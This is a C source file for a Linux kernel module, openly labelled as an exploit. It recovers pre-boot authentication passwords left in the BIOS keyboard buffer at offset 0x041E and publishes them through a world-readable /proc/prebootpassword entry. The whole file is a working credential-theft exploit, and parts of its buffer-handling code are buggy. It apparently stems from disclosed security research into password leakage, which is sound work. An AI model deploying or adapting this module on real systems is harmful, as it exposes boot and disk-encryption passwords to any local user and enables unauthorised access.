/*
*
* Trivial LKM exploit to display the content of BIOS Keyboard buffer in /proc/prebootpassword .
*
* // Jonathan Brossard - jonathan@ivizindia.com - endrazine@gmail.com
*
*/

#include <linux/init.h>
#include <linux/module.h>
#include <linux/string.h>

#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/string.h>

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Pre Boot Authentication Password LKM Exploit");
MODULE_AUTHOR("Jonathan Brossard // endrazine");


#define BiosKeyboardBuffer 0x041E


/*
* Write password to /proc entry routine
*/
static int sploit_read_pass( char *page, char **start, off_t off, int count, int *eof, void *data )
{
	char tab[32];
	char tab2[16];

	int i=0, j, password_flag = 0;
	int len=0;

	if (off > 0) {
		*eof = 1;
		return 0;
	}

	/* buffer starts at kernel base address + BiosKeyboardBuffer */
	sprintf(tab, "%s", BiosKeyboardBuffer + PAGE_OFFSET );

	for (j = 0; j < 16; j++) {		tab2[i] = tab[2 * j];		i++;		
		if (tab2[i] <= 0x7e && tab2[i] >= 0x30 )
			password_flag = 1;
	}

	if (!password_flag) {		len=sprintf(page, "No password found\n");
		return len;
	} else {
		len=sprintf(page, "Password to the latest pre boot authentication software) : ");
			for (i = 0; i < 16; i++) {

			/*
			* We might have several passwords concatenated in case of multiple preboot authentication softs
			*/
			if ( i<15 && tab2[i] == 0x0d && tab2[i+1] != 0x0d && tab2[i+1] <= 0x7e && tab2[i+1] >= 0x30 ) {				len += sprintf(page, "%s\n--[ Password (to a previous authentication software) :", page);
			} else if (tab2[i] <= 0x7e && tab2[i] >= 0x30) {
				sprintf(page, "%s%c", page, tab2[i]);
				len++;			} else {
				break;			
			}
		}
		sprintf(page, "%s\n",page);
		len++;
	}
	return len;
}


/*
* Loading routine : creates an entry in /proc and defines the previous function
* as its reading entry.
*/
static int sploit_init(void)
{
	static struct proc_dir_entry *proc_entry;

	printk("\n--[ BIOS keyboard buffer hysteresis LKM exploit\n"
				" // Jonathan Brossard - jonathan@ivizindia.com - endrazine@gmail.com\n");

	proc_entry = create_proc_entry( "prebootpassword", 0444, NULL );

	if (proc_entry == NULL) {
		printk(KERN_ALERT "Couldn't create /proc entry\n");
		return 1;
	} else {

		proc_entry->read_proc = sploit_read_pass;
		proc_entry->owner = THIS_MODULE;
	}
	return 0;
}

/*
* Unloading routine
*/
static int sploit_exit(void)
{
	remove_proc_entry("prebootpassword", &proc_root);
	printk("--[ Unloading module\n");
	return 0;
}

module_init(sploit_init);
module_exit(sploit_exit);


